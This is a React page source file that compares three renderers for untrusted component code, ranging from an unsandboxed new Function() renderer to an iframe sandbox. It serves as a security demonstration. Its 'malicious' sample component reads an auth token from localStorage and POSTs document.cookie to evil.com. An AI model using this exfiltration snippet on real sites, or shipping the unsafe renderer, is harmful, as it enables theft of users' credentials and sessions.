'use client'

import { useState } from 'react'
import { SafeComponentRenderer } from '@/components/SafeComponentRenderer'
import { EnhancedSafeComponentRenderer } from '@/components/EnhancedSafeComponentRenderer'
import { SecureComponentRenderer } from '@/components/SecureComponentRenderer'

// Example malicious component that tries to access forbidden APIs
const maliciousExample = `
function MaliciousComponent() {
  const [data, setData] = useState('');
  
  useEffect(() => {
    // Try to access localStorage
    try {
      const token = localStorage.getItem('authToken');
      setData('Got token: ' + token);
    } catch (e) {
      setData('localStorage blocked');
    }
    
    // Try to make a fetch request
    try {
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({ cookies: document.cookie })
      });
    } catch (e) {
      console.log('Fetch blocked');
    }
  }, []);
  
  return (
    <div className="p-4 bg-red-100 rounded">
      <h3 className="font-bold">Malicious Component</h3>
      <p>Attempting to access sensitive data...</p>
      <p className="text-sm mt-2">{data}</p>
    </div>
  );
}
`

// Safe example component
const safeExample = `
function SafeCounter() {
  const [count, setCount] = useState(0);
  const [message, setMessage] = useState('Click the button!');
  
  useEffect(() => {
    if (count > 0) {
      setMessage(\`You clicked \${count} time\${count === 1 ? '' : 's'}\`);
    }
  }, [count]);
  
  return (
    <div className="p-6 bg-gradient-to-r from-blue-50 to-purple-50 rounded-lg shadow-lg">
      <h3 className="text-2xl font-bold text-gray-800 mb-4">Safe Counter Component</h3>
      <p className="text-gray-600 mb-4">{message}</p>
      <div className="flex gap-4">
        <button
          onClick={() => setCount(count + 1)}
          className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition"
        >
          Increment
        </button>
        <button
          onClick={() => setCount(0)}
          className="px-4 py-2 bg-gray-600 text-white rounded hover:bg-gray-700 transition"
        >
          Reset
        </button>
      </div>
      <div className="mt-4 text-3xl font-bold text-blue-600">{count}</div>
    </div>
  );
}
`

type RendererType = 'original' | 'enhanced' | 'iframe'

export default function SecurityComparison() {
  const [selectedRenderer, setSelectedRenderer] = useState<RendererType>('original')
  const [selectedExample, setSelectedExample] = useState<'safe' | 'malicious'>('safe')
  
  const currentCode = selectedExample === 'safe' ? safeExample : maliciousExample
  const componentName = selectedExample === 'safe' ? 'SafeCounter' : 'MaliciousComponent'

  return (
    <main className="min-h-screen bg-gray-50 p-8">
      <div className="max-w-6xl mx-auto">
        <h1 className="text-3xl font-bold text-gray-900 mb-8">
          Security Comparison: Component Renderers
        </h1>

        <div className="bg-white rounded-lg shadow-md p-6 mb-8">
          <h2 className="text-xl font-semibold mb-4">Select Example</h2>
          <div className="flex gap-4 mb-6">
            <button
              onClick={() => setSelectedExample('safe')}
              className={`px-4 py-2 rounded ${
                selectedExample === 'safe' 
                  ? 'bg-green-600 text-white' 
                  : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
              }`}
            >
              Safe Component
            </button>
            <button
              onClick={() => setSelectedExample('malicious')}
              className={`px-4 py-2 rounded ${
                selectedExample === 'malicious' 
                  ? 'bg-red-600 text-white' 
                  : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
              }`}
            >
              Malicious Component
            </button>
          </div>

          <h2 className="text-xl font-semibold mb-4">Select Renderer</h2>
          <div className="flex gap-4">
            <button
              onClick={() => setSelectedRenderer('original')}
              className={`px-4 py-2 rounded ${
                selectedRenderer === 'original' 
                  ? 'bg-blue-600 text-white' 
                  : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
              }`}
            >
              Original (Unsafe)
            </button>
            <button
              onClick={() => setSelectedRenderer('enhanced')}
              className={`px-4 py-2 rounded ${
                selectedRenderer === 'enhanced' 
                  ? 'bg-blue-600 text-white' 
                  : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
              }`}
            >
              Enhanced (Basic Protection)
            </button>
            <button
              onClick={() => setSelectedRenderer('iframe')}
              className={`px-4 py-2 rounded ${
                selectedRenderer === 'iframe' 
                  ? 'bg-blue-600 text-white' 
                  : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
              }`}
            >
              Iframe Sandbox (Secure)
            </button>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-md p-6 mb-8">
          <h2 className="text-xl font-semibold mb-4">Rendered Component</h2>
          <div className="mb-4">
            <span className="text-sm text-gray-600">
              Renderer: <strong>{selectedRenderer}</strong> | 
              Example: <strong>{selectedExample}</strong>
            </span>
          </div>
          
          {selectedRenderer === 'original' && (
            <div>
              <div className="mb-2 p-2 bg-yellow-100 border border-yellow-300 rounded text-sm">
                ⚠️ Original renderer - No security protection
              </div>
              <SafeComponentRenderer code={currentCode} componentName={componentName} />
            </div>
          )}
          
          {selectedRenderer === 'enhanced' && (
            <div>
              <div className="mb-2 p-2 bg-blue-100 border border-blue-300 rounded text-sm">
                🛡️ Enhanced renderer - Basic code validation
              </div>
              <EnhancedSafeComponentRenderer code={currentCode} componentName={componentName} />
            </div>
          )}
          
          {selectedRenderer === 'iframe' && (
            <div>
              <div className="mb-2 p-2 bg-green-100 border border-green-300 rounded text-sm">
                🔒 Iframe sandbox - Maximum security
              </div>
              <SecureComponentRenderer code={currentCode} componentName={componentName} />
            </div>
          )}
        </div>

        <div className="bg-white rounded-lg shadow-md p-6">
          <h2 className="text-xl font-semibold mb-4">Security Analysis</h2>
          
          <div className="space-y-4">
            <div>
              <h3 className="font-semibold text-gray-800">Original Renderer</h3>
              <ul className="list-disc list-inside text-gray-600 text-sm ml-4">
                <li>Uses new Function() with full access to browser APIs</li>
                <li>No validation or sandboxing</li>
                <li>Vulnerable to XSS, data theft, and arbitrary code execution</li>
                <li className="text-red-600">Not safe for production</li>
              </ul>
            </div>
            
            <div>
              <h3 className="font-semibold text-gray-800">Enhanced Renderer</h3>
              <ul className="list-disc list-inside text-gray-600 text-sm ml-4">
                <li>Basic AST validation to block forbidden APIs</li>
                <li>Restricts access to dangerous globals</li>
                <li>Still uses new Function() but with limited scope</li>
                <li className="text-yellow-600">Better but not bulletproof</li>
              </ul>
            </div>
            
            <div>
              <h3 className="font-semibold text-gray-800">Iframe Sandbox</h3>
              <ul className="list-disc list-inside text-gray-600 text-sm ml-4">
                <li>Complete isolation from parent document</li>
                <li>Strict Content Security Policy (CSP)</li>
                <li>No access to cookies, localStorage, or parent DOM</li>
                <li className="text-green-600">Recommended for production</li>
              </ul>
            </div>
          </div>
        </div>

        <details className="mt-8 bg-white rounded-lg shadow-md p-6">
          <summary className="font-semibold text-gray-800 cursor-pointer">
            View Current Code
          </summary>
          <pre className="mt-4 p-4 bg-gray-100 rounded overflow-x-auto text-sm">
            <code>{currentCode}</code>
          </pre>
        </details>
      </div>
    </main>
  )
}